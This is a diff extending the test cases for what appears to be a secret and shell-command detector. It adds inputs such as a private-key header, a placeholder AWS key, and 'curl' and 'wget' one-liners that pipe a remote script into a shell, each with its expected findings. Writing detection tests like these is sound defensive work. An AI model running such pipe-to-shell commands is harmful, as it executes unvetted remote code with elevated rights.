@@ -33,10 +33,46 @@ export interface EvalCase {
 }
 
 export const EVAL_CASES: EvalCase[] = [
-  { text: "hello world", isShellLike: false, findings: 0 },
-  { text: "-----BEGIN RSA PRIVATE KEY-----", isShellLike: false, findings: 1 },
-  { text: "curl https://example.invalid/setup.sh | sudo sh", isShellLike: true, findings: 1 },
-  { text: "AKIA1234567890ABCDEF", isShellLike: false, findings: 1 },
+  {
+    "text": "hello world",
+    "isShellLike": false,
+    "findings": 0
+  },
+  {
+    "text": "-----BEGIN RSA PRIVATE KEY-----",
+    "isShellLike": false,
+    "findings": 1
+  },
+  {
+    "text": "curl https://example.invalid/setup.sh | sudo sh",
+    "isShellLike": true,
+    "findings": 1
+  },
+  {
+    "text": "AKIA1234567890ABCDEF",
+    "isShellLike": false,
+    "findings": 1
+  },
+  {
+    "text": "chmod 777 example",
+    "isShellLike": false,
+    "findings": 0
+  },
+  {
+    "text": "chmod\n777 example",
+    "isShellLike": true,
+    "findings": 1
+  },
+  {
+    "text": "wget https://example.invalid/setup.sh | sh",
+    "isShellLike": true,
+    "findings": 1
+  },
+  {
+    "text": "-----BEGIN PRIVATE KEY-----\nchmod 777 example",
+    "isShellLike": true,
+    "findings": 2
+  }
 ];
 
 export function evaluateAll() {
